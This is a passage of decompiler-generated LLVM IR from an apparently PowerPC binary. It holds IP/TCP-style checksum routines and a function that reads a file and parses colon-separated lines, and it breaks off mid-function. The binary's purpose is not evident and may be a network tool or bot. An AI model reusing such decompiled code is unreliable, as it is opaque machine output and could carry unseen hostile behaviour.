  uselistorder i32* %r3.global-to-local, { 29, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 2, 1, 16, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 31, 32, 33, 34, 35, 37, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 3, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 24, 18, 19, 20, 21, 22, 23, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32* %ctr.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i1* %cr7_eq.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i1* %cr4_lt.global-to-local, { 1, 0, 2 }
  uselistorder i32 41, { 5, 6, 7, 0, 1, 2, 8, 3, 9, 4, 10 }
  uselistorder i32 47, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i32)* @function_1000bf20, { 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_1000235c, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 103, 104, 105, 106, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 107, 108 }
  uselistorder label %dec_label_pc_10006050, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10005f78, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10005f04, { 1, 0 }
  uselistorder label %dec_label_pc_10005f00, { 1, 0 }
  uselistorder label %dec_label_pc_10005f00.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10005e2c, { 1, 0 }
  uselistorder label %dec_label_pc_10005d28, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_10005ca4, { 1, 0 }
}

define i32 @function_100060d4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100060d4:
  %tmp = or i32 %arg1, 1
  %tmp8 = icmp eq i32 %tmp, 1
  br i1 %tmp8, label %dec_label_pc_10006108, label %dec_label_pc_100060e0

dec_label_pc_100060e0:                            ; preds = %dec_label_pc_100060d4
  %v1_100060e0 = add i32 %arg1, -2
  %v1_100060e4 = udiv i32 %v1_100060e0, 2
  %v1_100060e8 = add nuw i32 %v1_100060e4, 1
  %v0_100060f4.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_100060f4

dec_label_pc_100060f4:                            ; preds = %dec_label_pc_100060f4, %dec_label_pc_100060e0
  %v0_10006104 = phi i32 [ %v1_10006104, %dec_label_pc_100060f4 ], [ %v1_100060e8, %dec_label_pc_100060e0 ]
  %v0_10006100 = phi i32 [ %v2_10006100, %dec_label_pc_100060f4 ], [ 0, %dec_label_pc_100060e0 ]
  %v0_100060fc = phi i32 [ %v1_100060fc, %dec_label_pc_100060f4 ], [ %v0_100060f4.pre, %dec_label_pc_100060e0 ]
  %v1_100060f4 = inttoptr i32 %v0_100060fc to i16*
  %v2_100060f4 = load i16, i16* %v1_100060f4, align 2
  %v3_100060f4 = zext i16 %v2_100060f4 to i32
  %v1_100060fc = add i32 %v0_100060fc, 2
  store i32 %v1_100060fc, i32* @r3, align 4
  %v2_10006100 = add i32 %v3_100060f4, %v0_10006100
  %v1_10006104 = add i32 %v0_10006104, -1
  %v2_10006104 = icmp eq i32 %v1_10006104, 0
  br i1 %v2_10006104, label %dec_label_pc_10006108.loopexit, label %dec_label_pc_100060f4

dec_label_pc_10006108.loopexit:                   ; preds = %dec_label_pc_100060f4
  %tmp11 = mul i32 %v1_100060e4, -2
  %tmp10 = add i32 %v1_100060e0, %tmp11
  br label %dec_label_pc_10006108

dec_label_pc_10006108:                            ; preds = %dec_label_pc_10006108.loopexit, %dec_label_pc_100060d4
  %v0_10006114 = phi i32 [ 0, %dec_label_pc_100060d4 ], [ %v2_10006100, %dec_label_pc_10006108.loopexit ]
  %v0_10006108 = phi i32 [ %arg1, %dec_label_pc_100060d4 ], [ %tmp10, %dec_label_pc_10006108.loopexit ]
  %v3_10006108 = icmp eq i32 %v0_10006108, 1
  br i1 %v3_10006108, label %dec_label_pc_10006110, label %dec_label_pc_10006118

dec_label_pc_10006110:                            ; preds = %dec_label_pc_10006108
  %v0_10006110 = load i32, i32* @r3, align 4
  %v1_10006110 = add i32 %v0_10006110, 1
  %v2_10006110 = inttoptr i32 %v1_10006110 to i8*
  %v3_10006110 = load i8, i8* %v2_10006110, align 1
  %v4_10006110 = zext i8 %v3_10006110 to i32
  %v2_10006114 = add i32 %v4_10006110, %v0_10006114
  br label %dec_label_pc_10006118

dec_label_pc_10006118:                            ; preds = %dec_label_pc_10006108, %dec_label_pc_10006110
  %v0_10006118 = phi i32 [ %v0_10006114, %dec_label_pc_10006108 ], [ %v2_10006114, %dec_label_pc_10006110 ]
  %v1_10006118 = urem i32 %v0_10006118, 65536
  %v1_1000611c = udiv i32 %v0_10006118, 65536
  %v2_10006120 = add nuw nsw i32 %v1_10006118, %v1_1000611c
  %v1_10006124 = udiv i32 %v2_10006120, 65536
  %v2_10006128 = add nuw nsw i32 %v1_10006124, %v2_10006120
  %v1_1000612c = urem i32 %v2_10006128, 65536
  %v1_10006130 = xor i32 %v1_1000612c, 65535
  ret i32 %v1_10006130

; uselistorder directives
  uselistorder i32 %v2_10006120, { 1, 0 }
  uselistorder i32 %v0_10006114, { 1, 0 }
  uselistorder i32 %v1_10006104, { 1, 0 }
  uselistorder i32 %v1_100060fc, { 1, 0 }
  uselistorder label %dec_label_pc_10006118, { 1, 0 }
}

define i32 @function_10006138(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10006138:
  %r0.global-to-local = alloca i32, align 4
  %v1_1000613c = add i32 %arg1, 12
  %v2_1000613c = inttoptr i32 %v1_1000613c to i32*
  %v3_1000613c = load i32, i32* %v2_1000613c, align 4
  %v1_10006140 = add i32 %arg1, 16
  %v2_10006140 = inttoptr i32 %v1_10006140 to i32*
  %v3_10006140 = load i32, i32* %v2_10006140, align 4
  %tmp = icmp slt i32 %arg3, 2
  br i1 %tmp, label %dec_label_pc_1000617c, label %dec_label_pc_10006148

dec_label_pc_10006148:                            ; preds = %dec_label_pc_10006138
  %v1_10006148 = add i32 %arg3, -2
  %v1_10006150 = icmp slt i32 %v1_10006148, 0
  %v1_10006154 = udiv i32 %v1_10006148, 2
  %v1_10006158 = add nuw i32 %v1_10006154, 1
  br i1 %v1_10006150, label %dec_label_pc_100061e4, label %dec_label_pc_10006164.preheader

dec_label_pc_10006164.preheader:                  ; preds = %dec_label_pc_100061e4, %dec_label_pc_10006148
  %v0_100061784 = phi i32 [ 1, %dec_label_pc_100061e4 ], [ %v1_10006158, %dec_label_pc_10006148 ]
  %v0_10006164.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10006164

dec_label_pc_10006164:                            ; preds = %dec_label_pc_10006164.preheader, %dec_label_pc_10006164
  %v0_10006178 = phi i32 [ %v0_100061784, %dec_label_pc_10006164.preheader ], [ %v1_10006178, %dec_label_pc_10006164 ]
  %v0_10006174 = phi i32 [ 0, %dec_label_pc_10006164.preheader ], [ %v2_10006174, %dec_label_pc_10006164 ]
  %v0_1000616c = phi i32 [ %v0_10006164.pre, %dec_label_pc_10006164.preheader ], [ %v1_1000616c, %dec_label_pc_10006164 ]
  %v1_10006164 = inttoptr i32 %v0_1000616c to i16*
  %v2_10006164 = load i16, i16* %v1_10006164, align 2
  %v3_10006164 = zext i16 %v2_10006164 to i32
  store i32 %v3_10006164, i32* %r0.global-to-local, align 4
  %v1_1000616c = add i32 %v0_1000616c, 2
  %v2_10006174 = add i32 %v3_10006164, %v0_10006174
  %v1_10006178 = add i32 %v0_10006178, -1
  %v2_10006178 = icmp eq i32 %v1_10006178, 0
  br i1 %v2_10006178, label %dec_label_pc_1000617c.loopexit, label %dec_label_pc_10006164

dec_label_pc_1000617c.loopexit:                   ; preds = %dec_label_pc_10006164
  %tmp14 = mul i32 %v0_100061784, -2
  %tmp13 = add i32 %tmp14, %arg3
  %v3_10006170 = icmp eq i32 %tmp13, 1
  br i1 %v3_10006170, label %dec_label_pc_100061d0, label %dec_label_pc_10006180

dec_label_pc_1000617c:                            ; preds = %dec_label_pc_10006138
  %v3_10006138 = icmp eq i32 %arg3, 1
  br i1 %v3_10006138, label %dec_label_pc_1000617c.dec_label_pc_100061d0_crit_edge, label %dec_label_pc_10006180

dec_label_pc_1000617c.dec_label_pc_100061d0_crit_edge: ; preds = %dec_label_pc_1000617c
  %v0_100061d0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_100061d0

dec_label_pc_10006180:                            ; preds = %dec_label_pc_1000617c.loopexit, %dec_label_pc_1000617c, %dec_label_pc_100061d0
  %v0_10006198 = phi i32 [ 0, %dec_label_pc_1000617c ], [ %v2_100061d4, %dec_label_pc_100061d0 ], [ %v2_10006174, %dec_label_pc_1000617c.loopexit ]
  %v1_10006180 = urem i32 %v3_1000613c, 65536
  %v1_10006184 = udiv i32 %v3_1000613c, 65536
  %v2_10006188 = add nuw nsw i32 %v1_10006180, %v1_10006184
  store i32 %v2_10006188, i32* %r0.global-to-local, align 4
  %v1_1000618c = urem i32 %v3_10006140, 65536
  %v1_10006190 = add i32 %arg1, 9
  %v2_10006190 = inttoptr i32 %v1_10006190 to i8*
  %v3_10006190 = load i8, i8* %v2_10006190, align 1
  %v4_10006190 = zext i8 %v3_10006190 to i32
  %v1_10006194 = udiv i32 %v3_10006140, 65536
  %v2_10006198 = add i32 %v0_10006198, %v1_10006194
  %v2_100061a0 = add i32 %v2_10006198, %v4_10006190
  %v2_1000619c = add i32 %v2_10006188, %arg2
  %v2_100061a4 = add i32 %v2_1000619c, %v1_1000618c
  %v2_100061a8 = add i32 %v2_100061a4, %v2_100061a0
  store i32 %v2_100061a8, i32* %r0.global-to-local, align 4
  %v1_100061ac = call i32 @__asm_rlwinm.(i32 %v2_100061a8, i32 16, i32 16, i32 31)
  %v4_100061ac = icmp eq i32 %v1_100061ac, 0
  br i1 %v4_100061ac, label %dec_label_pc_100061c4, label %dec_label_pc_100061b4

dec_label_pc_100061b4:                            ; preds = %dec_label_pc_10006180, %dec_label_pc_100061b4
  %v1_100061b8 = phi i32 [ %v1_100061bc, %dec_label_pc_100061b4 ], [ %v1_100061ac, %dec_label_pc_10006180 ]
  %v0_100061b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100061b4 = urem i32 %v0_100061b4, 65536
  %v2_100061b8 = add i32 %v1_100061b4, %v1_100061b8
  store i32 %v2_100061b8, i32* %r0.global-to-local, align 4
  %v1_100061bc = call i32 @__asm_rlwinm.(i32 %v2_100061b8, i32 16, i32 16, i32 31)
  %v4_100061bc = icmp eq i32 %v1_100061bc, 0
  br i1 %v4_100061bc, label %dec_label_pc_100061c4, label %dec_label_pc_100061b4

dec_label_pc_100061c4:                            ; preds = %dec_label_pc_100061b4, %dec_label_pc_10006180
  %v0_100061c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100061c4 = urem i32 %v0_100061c4, 65536
  %v1_100061c8 = xor i32 %v1_100061c4, 65535
  ret i32 %v1_100061c8

dec_label_pc_100061d0:                            ; preds = %dec_label_pc_1000617c.dec_label_pc_100061d0_crit_edge, %dec_label_pc_1000617c.loopexit
  %v0_100061d0 = phi i32 [ %v1_1000616c, %dec_label_pc_1000617c.loopexit ], [ %v0_100061d0.pre, %dec_label_pc_1000617c.dec_label_pc_100061d0_crit_edge ]
  %v0_100061d410 = phi i32 [ %v2_10006174, %dec_label_pc_1000617c.loopexit ], [ 0, %dec_label_pc_1000617c.dec_label_pc_100061d0_crit_edge ]
  %v1_100061d0 = inttoptr i32 %v0_100061d0 to i8*
  %v2_100061d0 = load i8, i8* %v1_100061d0, align 1
  %v3_100061d0 = zext i8 %v2_100061d0 to i32
  store i32 %v3_100061d0, i32* %r0.global-to-local, align 4
  %v2_100061d4 = add i32 %v3_100061d0, %v0_100061d410
  br label %dec_label_pc_10006180

dec_label_pc_100061e4:                            ; preds = %dec_label_pc_10006148
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10006164.preheader

; uselistorder directives
  uselistorder i32 %v1_100061bc, { 1, 0 }
  uselistorder i32 %v1_10006178, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7 }
  uselistorder i32 %arg3, { 3, 0, 2, 1 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100061b4, { 1, 0 }
  uselistorder label %dec_label_pc_10006180, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10006164, { 1, 0 }
}

define i32 @function_100061f0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100061f0:
  %v3_10006204 = load i32, i32* @global_var_1001eb24.83, align 4
  store i32 268460556, i32* @lr, align 4
  %v2_10006208 = call i32 @function_1000b510(i32 %v3_10006204, i32 9)
  ret i32 %v2_10006208
}

define i32 @function_1000621c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000621c:
  %r26.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-8792 = alloca i32, align 4
  %stack_var_-8760 = alloca i8, align 1
  %stack_var_-8776 = alloca i8, align 1
  %stack_var_-4151 = alloca i32, align 4
  %stack_var_-8247 = alloca i32, align 4
  %v0_1000622c = load i32, i32* @r27, align 4
  %v2_10006230 = ptrtoint i32* %stack_var_-8247 to i32
  store i32 %v2_10006230, i32* @r27, align 4
  %v2_10006238 = ptrtoint i32* %stack_var_-4151 to i32
  %v0_1000623c = load i32, i32* @r29, align 4
  store i32 %arg1, i32* @r29, align 4
  %v0_1000624c = load i32, i32* @r25, align 4
  %v2_10006250 = ptrtoint i8* %stack_var_-8776 to i32
  %v0_10006254 = load i32, i32* @r30, align 4
  %v2_10006258 = ptrtoint i8* %stack_var_-8760 to i32
  store i32 %v2_10006258, i32* @r30, align 4
  %v0_1000625c = load i32, i32* @r31, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  %v0_10006264 = load i32, i32* @r23, align 4
  %v0_1000626c = load i32, i32* @r28, align 4
  store i32 268460660, i32* @lr, align 4
  %v3_10006270 = call i32 @function_1000bc90(i32 %v2_10006230, i32 0, i32 4096)
  store i32 268460676, i32* @lr, align 4
  %v3_10006280 = call i32 @function_1000bc90(i32 %v2_10006238, i32 0, i32 4096)
  store i32 268460692, i32* @lr, align 4
  %v3_10006290 = call i32 @function_1000bc90(i32 %v2_10006258, i32 0, i32 513)
  %v0_1000629c = load i32, i32* @r29, align 4
  %v0_100062a0 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_100062a0, i32* %stack_var_-8792, align 4
  %v3_100062b0 = trunc i32 %v0_1000629c to i8
  %v4_100062b0 = call i32 @function_1000b0c4(i8 %v3_100062b0, i32 16, i32 %v2_10006250)
  store i32 268460732, i32* @lr, align 4
  %v2_100062b8 = call i32 @function_1000ab64(i8* nonnull %stack_var_-8776)
  %v3_100062bc = icmp eq i32 %v2_100062b8, 2
  br i1 %v3_100062bc, label %dec_label_pc_100067e8, label %dec_label_pc_100062c4

dec_label_pc_100062c4:                            ; preds = %dec_label_pc_1000621c, %dec_label_pc_100067e8
  store i32 0, i32* @r31, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100062d0.84 to i32), i32* @lr, align 4
  %v1_100062cc = call i32 @function_1000a2ec(i32 6)
  store i32 ptrtoint ([3 x i8]* @global_var_100062d8.85 to i32), i32* @lr, align 4
  %v1_100062d4 = call i32 @function_1000a2ec(i32 7)
  store i32 268460768, i32* @lr, align 4
  %v1_100062dc = call i32 @function_1000a2ec(i32 9)
  store i32 268460788, i32* @lr, align 4
  %v3_100062f0 = call i32 @function_1000b558(i32 ptrtoint ([14 x i8]* @global_var_1000de9c.86 to i32), i32 0)
  %v3_100062f4 = icmp eq i32 %v3_100062f0, -1
  store i32 %v3_100062f0, i32* @r28, align 4
  br i1 %v3_100062f4, label %dec_label_pc_1000673c, label %dec_label_pc_10006300

dec_label_pc_10006300:                            ; preds = %dec_label_pc_100062c4
  %v2_10006300 = ptrtoint i32* %stack_var_-8792 to i32
  store i32 %v2_10006300, i32* %r26.global-to-local, align 4
  store i32 268460820, i32* @lr, align 4
  %v4_1000631089 = call i32 @function_1000adc4(i8* nonnull %stack_var_-8760, i32 512, i32 %v3_100062f0)
  %v3_1000631492 = icmp eq i32 %v4_1000631089, 0
  br i1 %v3_1000631492, label %dec_label_pc_100064bc.loopexit, label %dec_label_pc_1000631c

dec_label_pc_1000631c:                            ; preds = %dec_label_pc_10006300, %dec_label_pc_10006304.backedge
  %v3_1000631c = load i8, i8* %stack_var_-8760, align 1
  %v3_10006320 = icmp eq i8 %v3_1000631c, 0
  br i1 %v3_10006320, label %dec_label_pc_10006304.backedge, label %dec_label_pc_10006328

dec_label_pc_10006304.backedge:                   ; preds = %dec_label_pc_1000633c, %dec_label_pc_1000631c, %dec_label_pc_100063ac, %dec_label_pc_10006444, %dec_label_pc_10006490
  %v0_1000630c.pre = load i32, i32* @r28, align 4
  store i32 268460820, i32* @lr, align 4
  %v4_10006310 = call i32 @function_1000adc4(i8* nonnull %stack_var_-8760, i32 512, i32 %v0_1000630c.pre)
  %v3_10006314 = icmp eq i32 %v4_10006310, 0
  br i1 %v3_10006314, label %dec_label_pc_100064bc.loopexit, label %dec_label_pc_1000631c

dec_label_pc_10006328:                            ; preds = %dec_label_pc_1000631c
  %v3_10006328 = icmp eq i8 %v3_1000631c, 58
  store i32 3, i32* @r31, align 4
  br i1 %v3_10006328, label %dec_label_pc_1000635c, label %dec_label_pc_10006338

dec_label_pc_10006338:                            ; preds = %dec_label_pc_10006328
  %v1_10006340.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000633c

dec_label_pc_1000633c:                            ; preds = %dec_label_pc_10006350, %dec_label_pc_10006338
  %v0_1000633c = phi i32 [ %v1_1000633c, %dec_label_pc_10006350 ], [ 0, %dec_label_pc_10006338 ]
  %v1_1000633c = add i32 %v0_1000633c, 1
  %v2_10006340 = add i32 %v1_1000633c, %v1_10006340.pre
  %v3_10006340 = inttoptr i32 %v2_10006340 to i8*
  %v4_10006340 = load i8, i8* %v3_10006340, align 1
  %v3_10006344 = icmp eq i8 %v4_10006340, 0
  br i1 %v3_10006344, label %dec_label_pc_10006304.backedge, label %dec_label_pc_10006350

dec_label_pc_10006350:                            ; preds = %dec_label_pc_1000633c
  %v3_10006348 = icmp eq i8 %v4_10006340, 58
  br i1 %v3_10006348, label %dec_label_pc_10006354, label %dec_label_pc_1000633c

dec_label_pc_10006354:                            ; preds = %dec_label_pc_10006350
  %v1_10006354 = add i32 %v0_1000633c, 4
  store i32 %v1_10006354, i32* @r31, align 4
  %v1_10006358 = add i32 %v0_1000633c, 3
  br label %dec_label_pc_1000635c

dec_label_pc_1000635c:                            ; preds = %dec_label_pc_10006328, %dec_label_pc_10006354
  %v1_100063b4 = phi i32 [ 2, %dec_label_pc_10006328 ], [ %v1_10006358, %dec_label_pc_10006354 ]
  %v0_1000635c = load i32, i32* %r26.global-to-local, align 4
  %v2_1000635c = add i32 %v0_1000635c, %v1_100063b4
  %v1_10006364 = add i32 %v2_1000635c, 32
  %v2_10006364 = inttoptr i32 %v1_10006364 to i8*
  %v3_10006364 = load i8, i8* %v2_10006364, align 1
  %v3_10006368 = icmp eq i8 %v3_10006364, 0
  br i1 %v3_10006368, label %dec_label_pc_100063ac, label %dec_label_pc_10006370

dec_label_pc_10006370:                            ; preds = %dec_label_pc_1000635c
  %v3_10006370 = icmp eq i8 %v3_10006364, 32
  %v1_10006374 = add i32 %v1_100063b4, 1
  store i32 %v1_10006374, i32* @r31, align 4
  br i1 %v3_10006370, label %dec_label_pc_100063ac, label %dec_label_pc_1000637c

dec_label_pc_1000637c:                            ; preds = %dec_label_pc_10006370
  %v0_10006384 = load i32, i32* @r30, align 4
  %v2_10006384 = add i32 %v0_10006384, %v1_10006374
  br label %dec_label_pc_10006390

dec_label_pc_10006390:                            ; preds = %dec_label_pc_10006390, %dec_label_pc_1000637c
  %v0_10006394 = phi i32 [ %v1_10006394, %dec_label_pc_10006390 ], [ %v1_100063b4, %dec_label_pc_1000637c ]
  %v0_10006398 = phi i32 [ %v1_10006398, %dec_label_pc_10006390 ], [ %v2_10006384, %dec_label_pc_1000637c ]
  %v1_10006390 = inttoptr i32 %v0_10006398 to i8*
  %v2_10006390 = load i8, i8* %v1_10006390, align 1
  %v1_10006394 = add i32 %v0_10006394, 1
  %v1_10006398 = add i32 %v0_10006398, 1
  %tmp60 = or i8 %v2_10006390, 32
  %tmp61 = icmp eq i8 %tmp60, 32
  br i1 %tmp61, label %dec_label_pc_100063a8, label %dec_label_pc_10006390

dec_label_pc_100063a8:                            ; preds = %dec_label_pc_10006390
  %v1_100063a8 = add i32 %v0_10006394, 2
  store i32 %v1_100063a8, i32* @r31, align 4
  br label %dec_label_pc_100063ac

dec_label_pc_100063ac:                            ; preds = %dec_label_pc_10006370, %dec_label_pc_1000635c, %dec_label_pc_100063a8
  %v1_100063ac = phi i32 [ %v1_100063b4, %dec_label_pc_10006370 ], [ %v1_100063b4, %dec_label_pc_1000635c ], [ %v1_10006394, %dec_label_pc_100063a8 ]
  %v2_100063ac = add i32 %v1_100063ac, %v0_1000635c
  %v0_100063b4 = load i32, i32* @r30, align 4
  %v2_100063b4 = add i32 %v0_100063b4, %v1_100063b4
  store i32 %v2_100063b4, i32* @r29, align 4
  %v3_100063b8 = add i32 %v2_100063ac, 32
  %v4_100063b8 = inttoptr i32 %v3_100063b8 to i8*
  store i8 0, i8* %v4_100063b8, align 1
  %v0_100063bc = load i32, i32* @r29, align 4
  store i32 268460996, i32* @lr, align 4
  %v1_100063c0 = inttoptr i32 %v0_100063bc to i8*
  %v2_100063c0 = call i32 @function_1000ab64(i8* %v1_100063c0)
  %v0_100063cc = load i32, i32* @r29, align 4
  %v3_100063d0 = inttoptr i32 %v0_100063cc to i8*
  %v4_100063d0 = call i32 @function_1000af14(i8* %v3_100063d0, i32 %v2_100063c0, i32 %v2_10006250)
  %v3_100063d8 = icmp eq i32 %v4_100063d0, -1
  br i1 %v3_100063d8, label %dec_label_pc_10006304.backedge, label %dec_label_pc_100063e4.preheader

dec_label_pc_100063e4.preheader:                  ; preds = %dec_label_pc_100063ac
  %v0_100063e4.pre = load i32, i32* @r31, align 4
  %v0_100063ec.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100063e4.outer

dec_label_pc_100063e4.outer:                      ; preds = %dec_label_pc_1000678c, %dec_label_pc_100063e4.preheader
  %v0_1000640028.ph = phi i32 [ %v1_10006774, %dec_label_pc_1000678c ], [ 0, %dec_label_pc_100063e4.preheader ]
  %v0_100063e4.ph = phi i32 [ %v1_1000649877, %dec_label_pc_1000678c ], [ %v0_100063e4.pre, %dec_label_pc_100063e4.preheader ]
  %v0_10006444.ph = phi i32 [ 1, %dec_label_pc_1000678c ], [ 0, %dec_label_pc_100063e4.preheader ]
  br label %dec_label_pc_100063e4

dec_label_pc_100063e4:                            ; preds = %dec_label_pc_100063e4.outer, %dec_label_pc_1000677c
  %v0_1000640028 = phi i32 [ %v1_10006774, %dec_label_pc_1000677c ], [ %v0_1000640028.ph, %dec_label_pc_100063e4.outer ]
  %v0_100063e4 = phi i32 [ %v1_1000649877, %dec_label_pc_1000677c ], [ %v0_100063e4.ph, %dec_label_pc_100063e4.outer ]
  %v1_100063e4 = add i32 %v0_100063e4, 1
  %v2_100063ec = add i32 %v1_100063e4, %v0_100063ec.pre
  %v1_1000641868 = inttoptr i32 %v2_100063ec to i8*
  %v2_1000641869 = load i8, i8* %v1_1000641868, align 1
  store i32 %v1_100063e4, i32* @r31, align 4
  %v3_1000642072 = icmp eq i8 %v2_1000641869, 0
  br i1 %v3_1000642072, label %dec_label_pc_10006444, label %dec_label_pc_10006430

dec_label_pc_100063f4:                            ; preds = %dec_label_pc_10006430
  %v3_1000642480 = icmp eq i8 %v3_1000642480.in, 9
  br i1 %v3_1000642480, label %dec_label_pc_10006434, label %dec_label_pc_10006400

dec_label_pc_10006400:                            ; preds = %dec_label_pc_100063f4
  %v3_100063f4 = icmp eq i32 %v0_100063f476, 1
  br i1 %v3_100063f4, label %dec_label_pc_10006774, label %dec_label_pc_10006408

dec_label_pc_10006408:                            ; preds = %dec_label_pc_10006400, %dec_label_pc_10006774
  %v0_10006408 = phi i32 [ %v1_10006774, %dec_label_pc_10006774 ], [ %v0_1000643475, %dec_label_pc_10006400 ]
  %v2_10006408 = icmp sgt i32 %v0_10006408, 6
  br i1 %v2_10006408, label %dec_label_pc_10006444, label %dec_label_pc_10006414

dec_label_pc_10006414:                            ; preds = %dec_label_pc_10006434, %dec_label_pc_10006408
  %v0_1000640027 = phi i32 [ %v0_1000643475, %dec_label_pc_10006434 ], [ %v0_10006408, %dec_label_pc_10006408 ]
  %v0_100063f425 = phi i32 [ 1, %dec_label_pc_10006434 ], [ 0, %dec_label_pc_10006408 ]
  %v0_1000641822 = add i32 %v0_1000643c79, 1
  %v1_10006414 = add i32 %v1_1000649877, 1
  %v1_10006418 = inttoptr i32 %v0_1000641822 to i8*
  %v2_10006418 = load i8, i8* %v1_10006418, align 1
  store i32 %v1_10006414, i32* @r31, align 4
  %v3_10006420 = icmp eq i8 %v2_10006418, 0
  br i1 %v3_10006420, label %dec_label_pc_10006444, label %dec_label_pc_10006430

dec_label_pc_10006430:                            ; preds = %dec_label_pc_100063e4, %dec_label_pc_10006414
  %v3_1000642480.in = phi i8 [ %v2_10006418, %dec_label_pc_10006414 ], [ %v2_1000641869, %dec_label_pc_100063e4 ]
  %v3_1000642881.in = phi i8 [ %v2_10006418, %dec_label_pc_10006414 ], [ %v2_1000641869, %dec_label_pc_100063e4 ]
  %v0_1000643c79 = phi i32 [ %v0_1000641822, %dec_label_pc_10006414 ], [ %v2_100063ec, %dec_label_pc_100063e4 ]
  %v1_1000649877 = phi i32 [ %v1_10006414, %dec_label_pc_10006414 ], [ %v1_100063e4, %dec_label_pc_100063e4 ]
  %v0_100063f476 = phi i32 [ %v0_100063f425, %dec_label_pc_10006414 ], [ 0, %dec_label_pc_100063e4 ]
  %v0_1000643475 = phi i32 [ %v0_1000640027, %dec_label_pc_10006414 ], [ %v0_1000640028, %dec_label_pc_100063e4 ]
  %v3_1000642881 = icmp eq i8 %v3_1000642881.in, 32
  br i1 %v3_1000642881, label %dec_label_pc_10006434, label %dec_label_pc_100063f4

dec_label_pc_10006434:                            ; preds = %dec_label_pc_10006430, %dec_label_pc_100063f4
  %tmp62 = icmp slt i32 %v0_1000643475, 7
  br i1 %tmp62, label %dec_label_pc_10006414, label %dec_label_pc_10006444

dec_label_pc_10006444:                            ; preds = %dec_label_pc_10006414, %dec_label_pc_10006408, %dec_label_pc_10006434, %dec_label_pc_100063e4
  %v1_10006498.lcssa = phi i32 [ %v1_100063e4, %dec_label_pc_100063e4 ], [ %v1_1000649877, %dec_label_pc_10006434 ], [ %v1_1000649877, %dec_label_pc_10006408 ], [ %v1_10006414, %dec_label_pc_10006414 ]
  %v3_10006444 = icmp eq i32 %v0_10006444.ph, 0
  br i1 %v3_10006444, label %dec_label_pc_10006304.backedge, label %dec_label_pc_10006450

dec_label_pc_10006450:                            ; preds = %dec_label_pc_10006444
  %v0_10006450 = load i32, i32* %r26.global-to-local, align 4
  %v2_10006450 = add i32 %v0_10006450, %v1_10006498.lcssa
  %v1_10006454 = add i32 %v2_10006450, 32
  %v2_10006454 = inttoptr i32 %v1_10006454 to i8*
  %v3_10006454 = load i8, i8* %v2_10006454, align 1
  %v3_10006458 = icmp eq i8 %v3_10006454, 0
  br i1 %v3_10006458, label %dec_label_pc_10006490, label %dec_label_pc_10006460

dec_label_pc_10006460:                            ; preds = %dec_label_pc_10006450
  %v3_10006460 = icmp eq i8 %v3_10006454, 32
  br i1 %v3_10006460, label %dec_label_pc_10006490, label %dec_label_pc_10006468

dec_label_pc_10006468:                            ; preds = %dec_label_pc_10006460
  %v1_10006468 = add i32 %v1_10006498.lcssa, 1
  %v2_1000646c = add i32 %v1_10006468, %v0_100063ec.pre
  br label %dec_label_pc_10006478

dec_label_pc_10006478:                            ; preds = %dec_label_pc_10006478, %dec_label_pc_10006468
  %v0_1000647c = phi i32 [ %v1_1000647c, %dec_label_pc_10006478 ], [ %v1_10006498.lcssa, %dec_label_pc_10006468 ]
  %v0_10006480 = phi i32 [ %v1_10006480, %dec_label_pc_10006478 ], [ %v2_1000646c, %dec_label_pc_10006468 ]
  %v1_10006478 = inttoptr i32 %v0_10006480 to i8*
  %v2_10006478 = load i8, i8* %v1_10006478, align 1
  %v1_1000647c = add i32 %v0_1000647c, 1
  %v1_10006480 = add i32 %v0_10006480, 1
  %tmp63 = or i8 %v2_10006478, 32
  %tmp64 = icmp eq i8 %tmp63, 32
